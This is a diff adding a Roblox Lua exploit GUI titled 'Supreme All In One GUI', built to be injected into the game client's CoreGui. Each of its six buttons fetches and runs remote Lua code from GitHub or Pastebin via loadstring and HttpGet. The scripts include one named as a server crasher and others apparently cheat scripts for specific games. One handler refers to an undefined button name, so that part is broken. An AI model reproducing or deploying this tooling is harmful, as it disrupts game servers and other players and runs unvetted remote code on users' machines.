@@ -1,0 +1,115 @@
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local SWAGCRASH = Instance.new("TextButton")
+local RAYX = Instance.new("TextButton")
+local SWAGMODE = Instance.new("TextButton")
+local FADED = Instance.new("TextButton")
+local TRUSTBOY = Instance.new("TextButton")
+local DIMAG = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(38, 25, 38)
+Frame.Position = UDim2.new(0.262690365, 0, 0.296222657, 0)
+Frame.Size = UDim2.new(0, 359, 0, 217)
+Frame.Active = true
+Frame.Draggable = true 
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(49, 32, 49)
+TextLabel.Size = UDim2.new(0, 359, 0, 38)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Supreme All In One GUI"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 36.000
+
+SWAGCRASH.Name = "SWAG CRASH"
+SWAGCRASH.Parent = Frame
+SWAGCRASH.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+SWAGCRASH.Position = UDim2.new(0.623955429, 0, 0.244239643, 0)
+SWAGCRASH.Size = UDim2.new(0, 135, 0, 26)
+SWAGCRASH.Font = Enum.Font.SourceSans
+SWAGCRASH.Text = "SWAG CRASH"
+SWAGCRASH.TextColor3 = Color3.fromRGB(0, 0, 0)
+SWAGCRASH.TextSize = 28.000
+SWAGCRASH.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+
+end)
+RAYX.Name = "RAY X"
+RAYX.Parent = Frame
+RAYX.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+RAYX.BorderColor3 = Color3.fromRGB(27, 42, 53)
+RAYX.Position = UDim2.new(0.211699158, 0, 0.244239643, 0)
+RAYX.Size = UDim2.new(0, 135, 0, 26)
+RAYX.Font = Enum.Font.SourceSans
+RAYX.Text = "RAY X"
+RAYX.TextColor3 = Color3.fromRGB(0, 0, 0)
+RAYX.TextSize = 30.000
+RAYX.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
+
+end)
+
+SWAGMODE.Name = "SWAG MODE"
+SWAGMODE.Parent = Frame
+SWAGMODE.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+SWAGMODE.Position = UDim2.new(0.211699158, 0, 0.516129017, 0)
+SWAGMODE.Size = UDim2.new(0, 135, 0, 26)
+SWAGMODE.Font = Enum.Font.SourceSans
+SWAGMODE.Text = "SWAG MODE"
+SWAGMODE.TextColor3 = Color3.fromRGB(0, 0, 0)
+SWAGMODE.TextSize = 30.000
+SWAGMODE.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
+
+end)
+
+FADED.Name = "FADED"
+FADED.Parent = Frame
+FADED.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+FADED.Position = UDim2.new(0.623955429, 0, 0.516129017, 0)
+FADED.Size = UDim2.new(0, 135, 0, 26)
+FADED.Font = Enum.Font.SourceSans
+FADED.Text = "FADED"
+FADED.TextColor3 = Color3.fromRGB(0, 0, 0)
+FADED.TextSize = 33.000
+FADED.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+
+end)
+
+TRUSTBOY.Name = "TRUST BOY"
+TRUSTBOY.Parent = Frame
+TRUSTBOY.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+TRUSTBOY.Position = UDim2.new(0.623955429, 0, 0.755760372, 0)
+TRUSTBOY.Size = UDim2.new(0, 135, 0, 26)
+TRUSTBOY.Font = Enum.Font.SourceSans
+TRUSTBOY.Text = "TRUST BOY"
+TRUSTBOY.TextColor3 = Color3.fromRGB(0, 0, 0)
+TRUSTBOY.TextSize = 30.000
+NAMEOFBUTTONHERE.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/XXAWmifh'))()
+
+end)
+
+DIMAG.Name = "DIMAG"
+DIMAG.Parent = Frame
+DIMAG.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+DIMAG.Position = UDim2.new(0.211699158, 0, 0.755760372, 0)
+DIMAG.Size = UDim2.new(0, 135, 0, 26)
+DIMAG.Font = Enum.Font.SourceSans
+DIMAG.Text = "DIMAG X"
+DIMAG.TextColor3 = Color3.fromRGB(0, 0, 0)
+DIMAG.TextSize = 35.000
+DIMAG.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Dimag16/DimagX_NEW/main/dimagx', true))()
+
+end)
